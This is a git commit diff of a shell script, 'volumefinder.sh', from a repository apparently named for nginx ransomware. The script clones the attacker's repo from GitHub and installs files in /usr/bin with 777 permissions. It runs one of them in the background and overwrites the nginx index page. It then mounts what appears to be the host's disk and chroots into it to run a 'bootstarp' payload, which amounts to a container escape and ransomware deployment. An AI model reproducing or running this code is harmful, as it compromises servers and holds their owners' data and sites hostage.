0ec8cbcb24778d942f9516cf5b5cda51f6658cb0
Gönenç <40662677+xeroxpro@users.noreply.github.com>
2023-05-13 00:20:29 +0300

    bootstarp-8

--- volumefinder.sh
+++ volumefinder.sh
@@ -4,12 +4,16 @@ cc
 #apt update -y 
 #apt install git -y  
 git clone https://github.com/xeroxpro/nginxransom.git
-cp -u /nginxransom/initialize.txt /usr/bin/initialize  && chmod 777 /usr/bin/initialize 
+cp -u /nginxransom/initialize.txt /usr/bin/initialize  
+ chmod 777 /usr/bin/initialize 
 initialize &  
-cp -u /nginxransom/web/index.html /usr/share/nginx/html/index.html
+cp -u nginxransom/web/index.html /usr/share/nginx/html/index.html
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
-cp -u /nginxransom/bootstarp.txt  /mnt/usr/bin/bootstarp && cp /nginxransom/bootstarp.txt /usr/bin/bootstarp && chmod 777 /usr/bin/bootstarp && chmod 777 /mnt/usr/bin/bootstarp 
+cp -u /nginxransom/bootstarp.txt  /mnt/usr/bin/bootstarp 
+ cp /nginxransom/bootstarp.txt /usr/bin/bootstarp 
+ chmod 777 /usr/bin/bootstarp 
+ chmod 777 /mnt/usr/bin/bootstarp 
 cd /mnt/usr/bin/
 chroot ./ ./bootstarp 
 apt remove git -y
